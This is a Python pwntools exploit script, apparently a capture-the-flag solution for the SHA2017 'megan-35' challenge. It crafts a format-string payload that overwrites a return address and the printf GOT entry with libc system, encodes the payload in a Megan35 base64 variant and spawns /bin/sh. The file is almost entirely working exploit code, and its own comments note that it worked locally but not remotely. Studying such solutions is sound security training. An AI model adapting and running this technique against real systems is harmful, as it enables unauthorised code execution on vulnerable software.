import base64
from pwn import *


################################################################################
#Megan35 encoder from https://sinister.ly/Thread-Source-Hazz15-Zong22-Megan35-Atom128
megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"

class B64VariantEncoder:

    def __init__(self, translation):
        base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.lookup = dict(zip(base, translation))
        self.revlookup = dict(zip(translation, base))

    def encode(self, text):
        global lookup
        b64 = base64.b64encode(text)
        result = "".join([self.lookup[x] for x in b64])
        return result

def encode(variant, text):
    encoder = B64VariantEncoder(variant)
    return encoder.encode(text)
################################################################################

###########################################################################
# Challenge: megan-35 from SHA2017                                        #
# Category: pwn                                                           #
# This challenge was an interesting one because it was a very simple      #
# and obvious format string vuln, except there isn't any function         #
# calls after the bug. This means we need to write to 2                   #
# locations in the single format string.                                  #
#                                                                         #
#    1. Overwrite the return address of main with main again.             #
#    2. Overwrite the printf GOT entry with system from our provided libc #
#                                                                         #
# As a result, it means that when we run main again - we can pass the raw #
# "/bin/sh" string to the second iteration of main and it will execute    #
# system() when we jump to printf.                                        #
#                                                                         #
###########################################################################

def main():
        #Seeing as we are given our libc and there isn't any ASLR, lets hardcode these.
        ret_addr = 0xffffd29c
        printf_got = 0x804a00c
        main_addr = 0x80484e0
        libc_system = 0xf7e31b30
        #libc_binsh = 0xf7f53c88 dont need this.

        #setup the 2 addresses we wish to write to on the stack
        #[main_return_address] + [main_return_address+2]
        #[printf_got_address] + [printf_got_address+2]
        print("[+] Creating write targets")
        encodedPayload = ''
        encodedPayload += p32(ret_addr)
        encodedPayload += p32(ret_addr+2)
        encodedPayload += p32(printf_got)
        encodedPayload += p32(printf_got+2)

        #grab the lowest & highest bytes from the main_addr & libc system address
        print("[+] grab LSB & HSB for our writes")
        mainLSB = (main_addr & 0xFFFF)
        mainHSB = (main_addr & 0xFFFF0000) >> 16
        systemLSB = (libc_system & 0xFFFF)
        systemHSB = (libc_system & 0xFFFF0000) >> 16

        #1. 2052 mainHSB
        #2. 6960 systemLSB
        #3. 34016 mainLSB
        #4. 63459 systemHSB

        #lets do some maths. :)
        #could have leaked an address dynamically here however didn't have time.
        print("[+] calculating our writes ")
        one = mainHSB - 16
        two = systemLSB - one - 16
        three = mainLSB - two - mainHSB
        four = systemHSB - three - 58576 - 7270
        #this worked locally, not remotely.
        encodedPayload += ('%'+str(one) + 'x%72$hn')
        encodedPayload += ('%'+str(two) + 'x%73$hn')
        encodedPayload += ('%'+str(three) + 'x%71$hn')
        encodedPayload += ('%'+str(four) + 'x%74$hn')

        #now encode the payload with our write.
        print("[+] encoding the payload ")
        payload = encode(megan35, encodedPayload)

        #start the local process
        r = process('./megan-35')

        #send the payload and trigger the format string
        print("[+] triggering format string.")
        r.sendline(payload)

        #now, encode the shell we want and send it again.
        x = encode(megan35, "/bin/sh")

        #this will trigger the system(""/bin/sh")
        print("[+] YAY enjoy your /bin/sh shell")
        r.sendline(x)

        #catch our shell :)
        r.interactive()


if __name__ == '__main__':
    main()
